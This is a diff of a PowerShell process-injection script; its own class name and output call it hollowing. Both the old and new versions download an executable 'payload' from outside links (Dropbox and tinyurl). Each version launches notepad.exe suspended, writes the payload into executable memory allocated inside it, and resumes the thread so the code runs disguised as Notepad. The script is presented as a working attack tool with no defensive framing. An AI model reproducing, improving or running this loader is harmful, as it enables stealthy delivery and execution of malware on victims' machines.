@@ -1,143 +1,76 @@
+# Set payload URL and download path
+$payloadUrl = "https://www.dropbox.com/scl/fi/2kod0sci09cgexv3i0aon/playload.exe?rlkey=s0ubz4gefsims5na5x8pvh5cb&st=685mcz4w&dl=0"  # <-- replace with your actual direct EXE link
+$payloadPath = "$env:TEMP\payload.exe"
+
+# Download the payload
+Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing
+
+# Read payload bytes
+$payload = [System.IO.File]::ReadAllBytes($payloadPath)
+
+# Add P/Invoke
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
 
-public class Win32 {
-    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+public class Hollow {
+    [StructLayout(LayoutKind.Sequential)]
     public struct STARTUPINFO {
-        public Int32 cb;
+        public int cb;
         public string lpReserved;
         public string lpDesktop;
         public string lpTitle;
-        public Int32 dwX;
-        public Int32 dwY;
-        public Int32 dwXSize;
-        public Int32 dwYSize;
-        public Int32 dwXCountChars;
-        public Int32 dwYCountChars;
-        public Int32 dwFillAttribute;
-        public Int32 dwFlags;
-        public Int16 wShowWindow;
-        public Int16 cbReserved2;
-        public IntPtr lpReserved2;
-        public IntPtr hStdInput;
-        public IntPtr hStdOutput;
-        public IntPtr hStdError;
+        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars;
+        public int dwFillAttribute;
+        public int dwFlags;
+        public short wShowWindow;
+        public short cbReserved2;
+        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
     }
 
     [StructLayout(LayoutKind.Sequential)]
     public struct PROCESS_INFORMATION {
-        public IntPtr hProcess;
-        public IntPtr hThread;
-        public Int32 dwProcessId;
-        public Int32 dwThreadId;
+        public IntPtr hProcess, hThread;
+        public int dwProcessId, dwThreadId;
     }
 
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool CreateProcess(
-        string lpApplicationName,
-        string lpCommandLine,
-        IntPtr lpProcessAttributes,
-        IntPtr lpThreadAttributes,
-        bool bInheritHandles,
-        uint dwCreationFlags,
-        IntPtr lpEnvironment,
-        string lpCurrentDirectory,
-        ref STARTUPINFO lpStartupInfo,
-        out PROCESS_INFORMATION lpProcessInformation
-    );
+        string lpAppName, string lpCmdLine, IntPtr lpProcessAttrs, IntPtr lpThreadAttrs,
+        bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
+        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr VirtualAllocEx(
-        IntPtr hProcess,
-        IntPtr lpAddress,
-        uint dwSize,
-        uint flAllocationType,
-        uint flProtect
-    );
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool WriteProcessMemory(
-        IntPtr hProcess,
-        IntPtr lpBaseAddress,
-        byte[] lpBuffer,
-        uint nSize,
-        out UIntPtr lpNumberOfBytesWritten
-    );
+    [DllImport("kernel32.dll")]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, uint size, out UIntPtr lpNumberOfBytesWritten);
 
-    [DllImport("kernel32.dll", SetLastError = true)]
+    [DllImport("kernel32.dll")]
     public static extern uint ResumeThread(IntPtr hThread);
 }
-"@ -PassThru
+"@
 
-# Replace this with your direct link to the payload .exe
-$payloadUrl = "https://tinyurl.com/mwr259jv"
-$tempPath = "$env:TEMP\payload.exe"
-
-try {
-    Invoke-WebRequest -Uri $payloadUrl -OutFile $tempPath -UseBasicParsing
-} catch {
-    Write-Host "[!] Failed to download payload."
-    exit
-}
-
-# Read the payload
-$payloadBytes = [System.IO.File]::ReadAllBytes($tempPath)
-
-# Setup STARTUPINFO and PROCESS_INFORMATION
-$si = New-Object Win32+STARTUPINFO
-$pi = New-Object Win32+PROCESS_INFORMATION
+# Setup structures
+$si = New-Object Hollow+STARTUPINFO
 $si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
+$pi = New-Object Hollow+PROCESS_INFORMATION
 
-# Start notepad in suspended mode
-$success = [Win32]::CreateProcess(
-    "C:\Windows\System32\notepad.exe",
-    $null,
-    [IntPtr]::Zero,
-    [IntPtr]::Zero,
-    $false,
-    0x4, # CREATE_SUSPENDED
-    [IntPtr]::Zero,
-    $null,
-    [ref]$si,
-    [ref]$pi
-)
+# Create Notepad in suspended mode
+$created = [Hollow]::CreateProcess("C:\Windows\System32\notepad.exe", $null, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x4, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
 
-if (-not $success) {
-    Write-Host "[!] Failed to create suspended process."
+if (-not $created) {
+    Write-Error "[-] Failed to create process."
     exit
 }
 
-# Allocate memory in target process
-$remoteAddr = [Win32]::VirtualAllocEx(
-    $pi.hProcess,
-    [IntPtr]::Zero,
-    [uint32]$payloadBytes.Length,
-    0x3000, # MEM_COMMIT | MEM_RESERVE
-    0x40    # PAGE_EXECUTE_READWRITE
-)
+# Allocate memory in target
+$base = [Hollow]::VirtualAllocEx($pi.hProcess, [IntPtr]::Zero, $payload.Length, 0x3000, 0x40)
 
-if ($remoteAddr -eq [IntPtr]::Zero) {
-    Write-Host "[!] Failed to allocate memory."
-    exit
-}
+# Write payload
+$written = [UIntPtr]::Zero
+[Hollow]::WriteProcessMemory($pi.hProcess, $base, $payload, $payload.Length, [ref]$written) | Out-Null
 
-# Write payload to remote memory
-$bytesWritten = [UIntPtr]::Zero
-$write = [Win32]::WriteProcessMemory(
-    $pi.hProcess,
-    $remoteAddr,
-    $payloadBytes,
-    [uint32]$payloadBytes.Length,
-    [ref]$bytesWritten
-)
-
-if (-not $write) {
-    Write-Host "[!] Failed to write memory."
-    exit
-}
-
-# Resume target process (payload will run if entry point is correct)
-[Win32]::ResumeThread($pi.hThread) | Out-Null
-
-Write-Host "[+] Injection complete. Notepad hollowed with payload."
+# Resume thread
+[Hollow]::ResumeThread($pi.hThread) | Out-Null
+Write-Host "[+] Injection complete."
